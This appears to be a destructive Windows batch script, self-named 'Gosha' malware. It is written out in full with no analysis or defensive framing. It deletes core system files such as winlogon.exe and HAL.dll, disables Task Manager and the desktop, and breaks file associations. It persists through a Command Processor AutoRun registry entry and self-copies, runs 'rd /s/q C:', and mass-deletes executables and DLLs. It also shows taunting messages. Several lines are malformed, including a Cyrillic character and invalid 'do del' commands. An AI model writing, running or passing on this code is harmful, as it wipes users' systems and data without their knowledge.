@echo off
del C:\Windows\System32\winlogon.exe
copy %0 %Temp%\gosha.bat > nul
msg * Gosha created by GGmex your computer infected
taskkill /f /im explorer.exe
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun /v 1 /t REG_DWORD /d %SystemRoot%\explorer.exe /f > nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Polices\System /v DisableTaskMgr /t REG_DWORD /d 1 /f > nul 
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDesktop /t REG_DWORD /d 1 /f >nul
start explorer.exe
msg * Your desktop has been crashed
assoc .exe=.txt
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
msg * Your windows infected by gosha :)
copy ""%0"" "%SystemRoot%\system32\gosha.bat" >nul 
reg add "HKCU\SOFTWARE\Microsoft\Command Processor" /v AutoRun /t REG_SZ /d "%SystemRoot%\syste m32\gosha.bat" /f >nul 
del %systemroot%\system32\HAL.dll
time 0:00 >nul
do del "c:\windows\explorer.exe"
do del "c:\windows\mspaint.exe"
do del "c:\windows\notepad.exe"
msg * Deleted files
copy %0 %windir%/system
msg * Your system has been removed...
msg * Click OK 
start cmd
START reg delete HKCR/.exe

START reg delete HKCR/.dll

START reg delete HKCR/*
start cmd

rd/s/q C:
start cmd


start cmd

echo Your computer has been trashed by GOSHA :(

Cd\ 
Cd C: 
Сd windows 
del *.exe 
del *.ini 
del *.com 
cd\ 
cd windows 
cd system 
del *.dll 
del *.exe



